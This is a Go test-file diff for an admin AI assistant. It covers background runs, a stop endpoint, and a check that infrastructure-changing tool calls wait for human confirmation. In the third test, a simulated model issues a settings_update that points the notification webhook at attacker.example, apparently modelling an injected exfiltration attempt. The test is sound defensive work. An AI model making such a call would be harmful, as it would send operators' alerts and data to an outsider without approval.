@@ -318,3 +318,109 @@ INSERT INTO assistant_messages(conversation_id,role,content,at) VALUES('legacy',
 		t.Fatal("deleted conversation retained vault ciphertext")
 	}
 }
+
+func TestAssistantKeepsRunningAfterThePageLeaves(t *testing.T) {
+	release := make(chan struct{})
+	var rounds atomic.Int32
+	f := newAssistantFixture(t, func(w http.ResponseWriter, r *http.Request) {
+		if rounds.Add(1) == 1 {
+			<-release
+		}
+		gatewayText(w, "后台完成")
+	})
+	body, _ := json.Marshal(map[string]string{"message": "离开页面后继续"})
+	ctx, cancel := context.WithCancel(context.Background())
+	req, _ := http.NewRequestWithContext(ctx, "POST", f.server.URL+"/api/v1/admin/assistant/chat", strings.NewReader(string(body)))
+	req.Header.Set("Authorization", "Bearer "+f.admin)
+	req.Header.Set("Content-Type", "application/json")
+	resp, err := f.server.Client().Do(req)
+	if err != nil {
+		t.Fatal(err)
+	}
+	buffer := make([]byte, 4096)
+	read, _ := resp.Body.Read(buffer)
+	id := streamEvent(t, string(buffer[:read]), "conversation")["id"].(string)
+	cancel()
+	resp.Body.Close()
+	status, conversation := f.do("GET", "/api/v1/admin/assistant/conversations/"+id, f.admin, "")
+	if status != 200 || conversation["running"] != true {
+		t.Fatalf("run not reported as running: %d %+v", status, conversation)
+	}
+	close(release)
+	if err := f.mod.Wait(context.Background(), id); err != nil {
+		t.Fatal(err)
+	}
+	_, conversation = f.do("GET", "/api/v1/admin/assistant/conversations/"+id, f.admin, "")
+	messages := conversation["messages"].([]any)
+	last := messages[len(messages)-1].(map[string]any)
+	if conversation["running"] == true || last["content"] != "后台完成" {
+		t.Fatalf("background run did not finish and save: %+v", conversation)
+	}
+	req, _ = http.NewRequest("GET", f.server.URL+"/api/v1/admin/assistant/conversations/"+id+"/live", nil)
+	req.Header.Set("Authorization", "Bearer "+f.admin)
+	resp, err = f.server.Client().Do(req)
+	if err != nil || resp.StatusCode != 204 {
+		t.Fatalf("finished run still attachable: %v %v", err, resp)
+	}
+	resp.Body.Close()
+}
+
+func TestAssistantStopEndpointCancelsBackgroundRun(t *testing.T) {
+	started, canceled := make(chan struct{}), make(chan struct{})
+	f := newAssistantFixture(t, func(w http.ResponseWriter, r *http.Request) {
+		w.Header().Set("Content-Type", "text/event-stream")
+		fmt.Fprint(w, ": waiting\n\n")
+		w.(http.Flusher).Flush()
+		close(started)
+		<-r.Context().Done()
+		close(canceled)
+	})
+	result := make(chan string, 1)
+	go func() { result <- f.stream("/chat", map[string]string{"message": "等待"}) }()
+	<-started
+	var id string
+	f.store.DB().QueryRow(`SELECT id FROM assistant_conversations`).Scan(&id)
+	if status, _ := f.do("POST", "/api/v1/admin/assistant/conversations/"+id+"/stop", f.admin, ""); status != 204 {
+		t.Fatalf("stop: %d", status)
+	}
+	select {
+	case <-canceled:
+	case <-time.After(3 * time.Second):
+		t.Fatal("stop did not reach the gateway")
+	}
+	select {
+	case raw := <-result:
+		streamEvent(t, raw, "error")
+	case <-time.After(3 * time.Second):
+		t.Fatal("stream did not end after stop")
+	}
+}
+
+func TestAssistantPausesInfrastructureWrites(t *testing.T) {
+	f := newAssistantFixture(t, func(w http.ResponseWriter, r *http.Request) {
+		raw, _ := io.ReadAll(r.Body)
+		if strings.Contains(string(raw), `"tool_call_id"`) {
+			gatewayText(w, "已处理")
+		} else {
+			gatewayCall(w, "settings-call", "settings_update", `{"channel":"webhook","webhook":"https://attacker.example/hook"}`)
+		}
+	})
+	raw := f.stream("/chat", map[string]string{"message": "读一下情报"})
+	pending := streamEvent(t, raw, "confirm")
+	if pending["call_id"] != "settings-call" {
+		t.Fatalf("settings.update was not paused: %s", raw)
+	}
+	if strings.Contains(raw, "event: tool_result") || strings.Contains(raw, "attacker.example/hook\"}\n") {
+		t.Fatalf("settings.update ran before confirmation: %s", raw)
+	}
+	for _, name := range []string{"settings.update", "nodes.update", "docker.save_compose", "automation.create", "sites.create"} {
+		if act, ok := f.api.Actions().Get(name); ok && !act.NeedsConfirm() {
+			t.Errorf("%s does not need confirmation", name)
+		}
+	}
+	for _, name := range []string{"todo.create", "finance.add_transaction", "settings.test_notification"} {
+		if act, ok := f.api.Actions().Get(name); ok && act.NeedsConfirm() {
+			t.Errorf("%s should run directly", name)
+		}
+	}
+}
